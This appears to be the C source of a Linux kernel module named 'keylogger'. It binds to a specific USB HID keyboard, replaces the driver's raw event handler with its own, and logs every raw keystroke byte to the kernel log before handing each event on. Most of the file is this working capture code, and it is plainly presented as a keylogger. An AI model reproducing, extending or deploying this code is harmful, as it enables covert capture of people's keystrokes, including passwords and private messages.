#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/usb.h>
#include <linux/hid.h>

#define VENDOR_ID 0x05ac
#define DEVICE_ID 0x026c

static int (*original_raw_event)(struct hid_device *hdev, struct hid_report *report, u8 *data, int size);

static int keylogger_event(struct hid_device *hdev, struct hid_report *report, u8 *data, int size)
{
	printk(KERN_INFO "size: %d\n", size);

	for (int i = 0; i < size; ++i)
		printk(KERN_INFO "keycode: 0x%x\n", data[i]);

	if (original_raw_event)
		return original_raw_event(hdev, report, data, size);

	return 0;
}

//static int keylogger_probe(struct usb_interface *iface, const struct usb_device_id *id)
static int keylogger_probe(struct hid_device *hdev, const struct hid_device_id *id)
{
	printk(KERN_ERR "calling probe...\n");

	//struct hid_device *hdev = usb_get_intfdata(iface);
	if (!hdev) {
		printk(KERN_ERR "Failed to get HID device from interface\n");
		return -ENODEV;
	}

	// save original raw_event handler
	original_raw_event = hdev->driver->raw_event;

	// register custom event handler
	hdev->driver->raw_event = keylogger_event;

	printk(KERN_INFO "keylogger connected\n");

	return 0;
}

//static void keylogger_disconnect(struct usb_interface *iface)
static void keylogger_disconnect(struct hid_device *hdev)
{
	//struct hid_device *hdev = usb_get_intfdata(iface);
	if (hdev)
		hdev->driver->raw_event = original_raw_event;

	printk(KERN_INFO "keylogger disconnected\n");
}

/*
static const struct usb_device_id id_table[] = {
	{USB_INTERFACE_INFO
		(USB_INTERFACE_CLASS_HID, USB_INTERFACE_SUBCLASS_BOOT,
		 USB_INTERFACE_PROTOCOL_KEYBOARD)},
	{}
};
*/
static const struct hid_device_id id_table[] = {
	{ HID_USB_DEVICE(VENDOR_ID, DEVICE_ID) },
	{}
};
MODULE_DEVICE_TABLE(hid, id_table);

//static struct usb_driver keylogger_driver = {
static struct hid_driver keylogger_driver = {
	.name = "keylogger",
	.id_table = id_table,
	.probe = keylogger_probe,
	//.disconnect = keylogger_disconnect,
	.remove = keylogger_disconnect,
	//.raw_event = keylogger_event
};

/*static int __init keylogger_init(void)
{
	printk(KERN_INFO "Registering keylogger\n");

	int ret = usb_register(&keylogger_driver);
	if (ret) {
		printk(KERN_INFO "Registering keylogger failed\n");
		return ret;
	}
	
	return 0;
}

static void __exit keylogger_exit(void)
{
	printk(KERN_INFO "Exiting keylogger\n");
	usb_deregister(&keylogger_driver);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
*/

//module_usb_driver(keylogger_driver);
module_hid_driver(keylogger_driver);

MODULE_LICENSE("GPL");

